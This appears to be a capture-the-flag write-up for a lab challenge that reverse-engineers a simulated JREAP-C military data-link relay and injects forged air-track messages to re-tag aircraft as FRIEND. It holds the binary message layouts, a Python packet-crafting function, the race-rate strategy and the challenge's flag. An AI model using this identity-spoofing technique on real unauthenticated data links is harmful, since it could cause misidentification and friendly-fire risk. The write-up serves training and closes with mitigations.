# TrackFlip — JREAP-C IFF Spoofing

## Challenge Summary

| Field | Value |
|---|---|
| **Challenge** | TrackFlip |
| **Category** | Hardware / Military Protocol |
| **Protocol** | JREAP-C (Joint Range Extension Applications Protocol C) |
| **Target** | `154.57.164.67:30142` (binary relay), `:32398` (COP display) |
| **Vulnerability** | Unauthenticated participant registration + no identity override validation |
| **Exploit** | Race-condition J2.0 air-track injection faster than operator reassert |

## Scenario

An OPFOR JREAP-C tactical relay shares a live Common Operational Picture (COP) for a fictional South Pacific exercise sector. Three BLUE aircraft — **EAGLE-11, EAGLE-12, EAGLE-13** — depart BLUE airspace on staggered tracks toward a covert extraction point inside a restricted OPFOR sector.

OPFOR WARDEN interceptors flying CAP racetracks are authorised to scramble on any **UNKNOWN** track that crosses the boundary. Once an interceptor commits to a target, it stays committed regardless of subsequent IFF changes.

The relay accepts unauthenticated participants and does not validate who issues identity overrides, but the operator periodically re-asserts the true UNKNOWN identity back onto each BLUE track.

**Goal**: Register on the relay and continuously stream J2.0 air-track updates that re-tag the EAGLE flight as **FRIEND**, fast enough to stay ahead of the reassert and prevent fresh interceptor scrambles.

---

## Information Gathering

### 1. Port Discovery

```bash
$ nc -z -v 154.57.164.67 30661
Connection to 154.57.164.67 30661 port [tcp/*] succeeded!

$ nc -z -v 154.57.164.67 32229
Connection to 154.57.164.67 32229 port [tcp/*] succeeded!
```

### 2. Service Identification — Port 32229

```bash
$ curl -s http://154.57.164.67:32229/ | head -5
HTTP/1.1 200 OK
Server: Werkzeug/3.1.8 Python/3.12.3
```

Port 32229 serves a web-based **TACTICAL DISPLAY** (COP) with:
- Leaflet.js map showing OPFOR/BLUE airspace
- Live track table for air, surface, and EW contacts
- JREAP-C message log panel
- WebSocket at `/ws/cop` pushing real-time JSON updates

Key WebSocket data fields:
- `air_tracks[]` — aircraft with `track_num`, `callsign`, `identity`, `identity_id`, position
- `ppli[]` — OPFOR WARDEN interceptors
- `warden_states{}` — interceptor state (PATROL / SCRAMBLED) and target
- `vipers[]` — mission-critical BLUE aircraft with state tracking
- `flag` — delivered when mission succeeds

### 3. Binary Protocol Analysis — Port 30661

Port 30661 streams length-prefixed binary JREAP-C messages:

```
$ nc 154.57.164.67 30661 | xxd | head -20
00000000: 0016 0601 0001 0041 002a 0001 0041 c1c7  .......A.*...A..
00000010: cead c30f 5e5c 0016 0601 0001 0042 002b  ....^\.......B.+
00000020: 0001 0042 c1c7 ee7f c30f fba0 0016 0601  ...B............
00000030: 0001 0043 002c 0001 0043 c1cb c745 c30e  ...C.,...C...E..
```

Every message is length-prefixed (big-endian 16-bit length as first two bytes).

#### Message Type 0x0601 (22 bytes) — PPLI / Interceptor Position

Tracks OPFOR WARDEN interceptors (A=WARDEN-411, B=WARDEN-422, C=WARDEN-433):

```
Offset  Size  Value        Description
0-1     2     0x0016 (22)  Message length
2-3     2     0x0601       Message type (J2.0 Basic / PPLI)
4-5     2     0x0001       Source/station
6       1     0x00         Separator
7       1     0x41-0x43    Track ID (A/B/C = WARDEN-411/422/433)
8-9     2     variable     Sequence number
10-11   2     0x0001       Field
12      1     0x00         Separator
13      1     0x41-0x43    Track ID (repeated)
14-21   8     IEEE 754 SP  Position (2× float32: lat, lon)
```

#### Message Type 0x0602 (32 bytes) — Extended Air Track

**THIS IS THE KEY MESSAGE FOR THE EXPLOIT.** Tracks EAGLE and other aircraft with identity data:

```
Offset  Size  Value        Description
0-1     2     0x0020 (32)  Message length
2-3     2     0x0602       Message type (J2.0 Extended)
4-5     2     0x0001       Header field
6-7     2     0x0001       Header field
8-9     2     variable     Sequence number
10-11   2     0x0002       Field marker
12-13   2     0x0021-...   Track reference number
14      1     0x00-0x04    **IDENTITY** (0x00=UNKNOWN, 0x03=FRIEND, 0x04=NEUTRAL)
15      1     0x01         Sub-field (constant)
16-23   8     IEEE 754 SP  Position (2× float32 BE: lat, lon)
24-25   2     var          Altitude (hundreds of feet)
26-27   2     var          Speed (knots)
28-29   2     var          Heading (degrees)
30-31   2     0x0000       Padding
```

**Identity byte mapping:**
| Byte 14 | identity_id | Meaning | COP Color |
|---------|-------------|---------|-----------|
| 0x00    | 0           | UNKNOWN | Amber     |
| 0x01    | 1           | HOSTILE | Red       |
| 0x03    | 3           | FRIEND  | Blue      |
| 0x04    | 4           | NEUTRAL | Green     |

Byte 15 is always `0x01` across all observed messages.

#### ACK Message 0x06FF (15 bytes)

The relay acknowledges injected messages:
```
Offset  Size  Description
0-1     2     0x000F (15)  Length
2-3     2     0x06FF       ACK type
4-5     2     Echo of source field
6-7     2     0x0000
8-9     2     Echo of sequence number
10-11   2     0x0000
12-13   2     0x0000
14      1     Echo of sequence LSB
```

---

## Vulnerability Assessment

### Vulnerability 1: Unauthenticated Participant Registration

Connecting to port 30661 and sending any valid JREAP-C message automatically registers the sender as a participant. The WebSocket participant counter increases immediately after connection.

**Risk**: Critical — No authentication, no handshake, no source validation.

### Vulnerability 2: No Identity Override Validation

The relay processes and ACKs identity override messages from any participant. There is no check on:
- Whether the sender is authorised to modify track identity
- Whether the claimed identity matches known IFF (Identification Friend or Foe) data
- The source or credibility of the track update

**Risk**: Critical — Any connected participant can set any track to FRIEND.

### Vulnerability 3: Race Condition on Identity Assertion

The operator periodically re-asserts UNKNOWN identity on BLUE tracks. If an attacker injects FRIEND updates at a higher frequency than the operator's reassert rate, the FRIEND identity persists long enough to prevent interceptor scrambles.

**Risk**: Critical — Simple race condition; the operator does not lock or serialise identity updates.

---

## Exploitation

### How We Solved It — Reasoning

**Initial approach — 22-byte messages (wrong):** We first attempted to modify the 22-byte 0x0601 messages (which track WARDEN interceptors, not EAGLE aircraft). These messages don't carry identity data and injections were ACK'd but had no effect on the COP.

**Key insight — 32-byte messages carry identity:** Comparing the binary stream with the WebSocket JSON revealed that 0x0602 (32-byte) messages carry the identity field at bytes 14-15. Testing against SPA-384 (a NEUTRAL airliner) confirmed the mapping:
- Sending `0x0301` at bytes 14-15 changed SPA-384 from NEUTRAL (id_id=4) to FRIEND (id_id=3) — confirmed via WebSocket.

**Position encoding pitfall:** Initial attempts used 64-bit doubles (`>dd`) for position data (16 bytes), which overflowed the 8-byte position field and corrupted subsequent fields. Correct format uses 32-bit IEEE 754 floats (`>ff`), as verified by round-tripping bytes from the simulator output.

**Identity byte structure:** The 16-bit field at offset 14-15 is actually two separate bytes:
- Byte 14: Identity value (0x00-0x04)
- Byte 15: Constant sub-field (0x01)

Our first attempts used `struct.pack('>H', 0x0003)` which set byte14=0x00, byte15=0x03 — wrong. The correct encoding is `struct.pack('>H', 0x0301)` for FRIEND.

### Verify Injection Works

Testing against a NEUTRAL track (SPA-384, track 0x0090):

```
Before: SPA-384 id=NEUTRAL id_id=4
Sending: 0020 0602 0001 0001 b000 0002 0090 0301 ...
After:  SPA-384 id=FRIEND  id_id=3  ✓ CONFIRMED
```

### Exploit Strategy

1. **Monitor** COP WebSocket for new ACTIVE missions (time_remaining > 350s)
2. **Identify** all EAGLE-* aircraft from `air_tracks` (track_nums: 0x0021, 0x0022, 0x0023)
3. **Connect** to port 30661 and continuously inject 0x0602 messages with identity=0x03 (FRIEND)
4. **Race** at ~30ms injection interval against operator's periodic UNKNOWN reassert
5. **Track** warden_states to verify no new scrambles occur
6. **Wait** for at least one EAGLE to complete the round trip (cross back into BLUE airspace)
7. **Capture** flag from WebSocket `d.flag` field

### Full Exploit Script

See [`trackflip_solve.py`](trackflip_solve.py) for the complete automated solution.

```python
def craft_j20_air_track(track_num, identity, lat, lon, alt, speed, heading):
    """Craft a 32-byte 0x0602 FRIEND identity injection."""
    msg  = struct.pack('>HH',  32, 0x0602)             # length, type
    msg += struct.pack('>HH',  0x0001, 0x0001)          # header
    msg += struct.pack('>H',   0xC000 + track_num)       # sequence
    msg += struct.pack('>H',   0x0002)                   # field marker
    msg += struct.pack('>H',   track_num)                # track reference
    msg += struct.pack('>H',   (identity << 8) | 0x01)  # IDENTITY = FRIEND
    msg += struct.pack('>ff',  lat, lon)                 # position (32-bit float)
    msg += struct.pack('>H',   alt)                      # altitude
    msg += struct.pack('>H',   speed)                    # speed
    msg += struct.pack('>H',   heading)                  # heading
    msg += struct.pack('>H',   0x0000)                   # padding
    return msg
```

### Injection Rate

The exploit sends at approximately 30-50Hz (one message per EAGLE every ~30ms). The relay ACKs every injected message. The operator's reassert appears to run at ~1Hz based on message log timestamps, giving our injection a decisive rate advantage.

---

## Security Implications

1. **Unauthenticated tactical data links** are a real-world concern. JREAP-C is designed for range extension in training exercises, and production deployments that lack authentication are vulnerable to exactly this class of attack.

2. **IFF spoofing via data link injection** could cause:
   - Friendly aircraft being marked hostile (friendly fire risk)
   - Hostile aircraft being marked friendly (airspace violation)
   - Confusion and delayed response from air defence operators

3. **Mitigations:**
   - Implement source authentication on JREAP-C participants (cryptographic signatures)
   - Validate identity overrides against authoritative IFF sources
   - Rate-limit or serialise identity updates per track
   - Monitor for anomalous injection patterns (high-frequency identity flipping)

---

## Flag

```text
HTB{J-S3r13s_Tr4ck_1d3nt1ty_Fl1p}
```

The flag was captured live from the replacement instance `154.57.164.67:32398` after the injector streamed 6,306 valid FRIEND updates through the relay at `154.57.164.67:30142`. At capture time, the mission remained active with 222 seconds remaining and all three EAGLE tracks were reported as FRIEND.